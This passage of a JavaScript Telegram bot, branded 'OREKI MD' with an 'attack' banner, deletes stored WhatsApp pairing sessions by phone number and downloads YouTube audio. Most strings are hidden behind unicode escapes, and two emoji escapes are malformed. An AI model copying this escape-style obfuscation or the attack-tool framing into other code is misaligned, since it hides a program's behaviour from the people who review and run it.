    return ctx.reply("\u0054\u006f\u0020\u0070\u0072\u006f\u0063\u0065\u0065\u0064\u0020\u0070\u006c\u007a\u0020\u0065\u006e\u0074\u0065\u0072\u0020\u0061\u0020\u0070\u0068\u006f\u006e\u0065\u0020\u006e\u0075\u006d\u0062\u0065\u0072\u0020\u0069\u006e\u0020\u0074\u0068\u0065\u0020\u0066\u006f\u0072\u006d\u0061\u0074\u003a\u0020\u002f\u0064\u0065\u006c\u0070\u0061\u0069\u0072\u0020\u0031\u0032\u0033\u0078\u0078\u0078\u0078\u0078\u0078\u0078\u0078", { parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e" });
  }

  const inputNumber = args[0].replace(/\D/g, ""); 

  const jidSuffix = `${inputNumber}@s.whatsapp.net`;

  const pairingPath = "\u002e\u002f\u0072\u0069\u0063\u0068\u0073\u0074\u006f\u0072\u0065\u002f\u0070\u0061\u0069\u0072\u0069\u006e\u0067";
  if (!fs.existsSync(pairingPath)) {
    return ctx.reply("\u004e\u006f\u0020\u0070\u0061\u0069\u0072\u0065\u0064\u0020\u0064\u0065\u0076\u0069\u0063\u0065\u0073\u0020\u0066\u006f\u0075\u006e\u0064\u002e");
  }

  const entries = fs.readdirSync(pairingPath, { withFileTypes: true });
  const matched = entries.find(entry => entry.isDirectory() && entry.name.endsWith(jidSuffix));

  if (!matched) {
    return ctx.reply(`No paired device found for number ${inputNumber}`, { parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e" });
  }

  const targetPath = `${pairingPath}/${matched.name}`;
  fs.rmSync(targetPath, { recursive: true, force: true });

  ctx.reply(
    `╔══════════════════════╗
║ 『🍙 𝐎𝐑𝐄𝐊𝐈 𝐌𝐃 | 攻撃 -Iɴғᴏ 』
╚══════════════════════╝

✅ ᴘᴀɪʀᴇᴅ ᴜꜱᴇʀ ʀᴇᴍᴏᴠᴇᴅ
────────────────────────
📱 ᴘʜᴏɴᴇ : \`${inputNumber}\`
🆔 ɪᴅ    : \`${matched.name}\`
────────────────────────`,
    { parse_mode: "\u004d\u0061\u0072\u006b\u0064\u006f\u0077\u006e" }
  );
});
bot.on("\u0074\u0065\u0078\u0074", async (ctx) => {
    const userId = ctx.from.id;

    if (userStates[userId] === "\u0077\u0061\u0069\u0074\u0069\u006e\u0067\u005f\u0066\u006f\u0072\u005f\u0073\u006f\u006e\u0067") {
        const text = ctx.message.text;

        try {
            ctx.reply("\u1f512\u0020\u006c\u006f\u006f\u006b\u0069\u006e\u0067\u0020\u0066\u006f\u0072\u002e\u002e\u002e");
            const search = await yts(text);
            const telaso = search.all[0].url;
            const response = await ytdl(telaso);
            const puki = response.data.mp3;

            await ctx.replyWithAudio({ url: puki }, {
                caption: `Title: ${search.all[0].title}\nDuration: ${search.all[0].timestamp}`,
            });
            ctx.reply("\u1f513\u0020\u0053\u0065\u006c\u0065\u0073\u0061\u0069\u0021");
        } catch (error) {
            console.error(error);
            ctx.reply("\u0041\u006e\u0020\u0065\u0072\u0072\u006f\u0072\u0020\u006f\u0063\u0063\u0075\u0072\u0072\u0065\u0064\u0020\u0077\u0068\u0069\u006c\u0065\u0020\u0064\u006f\u0077\u006e\u006c\u006f\u0061\u0064\u0069\u006e\u0067\u0020\u0074\u0068\u0065\u0020\u0073\u006f\u006e\u0067\u002c\u0020\u0070\u006c\u0065\u0061\u0073\u0065\u0020\u0074\u0072\u0079\u0020\u0061\u0067\u0061\u0069\u006e\u0020\u006c\u0061\u0074\u0065\u0072\u002e");
        }

        delete userStates[userId];
    }
});

bot.launch()
    .then(() => console.log("\u0054\u0068\u0065\u0020\u0062\u006f\u0074\u0020\u0069\u0073\u0020\u0072\u0075\u006e\u006e\u0069\u006e\u0067\u0020\u0073\u0075\u0063\u0063\u0065\u0073\u0073\u0066\u0075\u006c\u006c\u0079"))
    .catch(err => console.error("\u0045\u0072\u0072\u006f\u0072\u0020\u0077\u0068\u0069\u006c\u0065\u0020\u0072\u0075\u006e\u006e\u0069\u006e\u0067\u0020\u0062\u006f\u0074\u003a", err));

module.exports = bot;
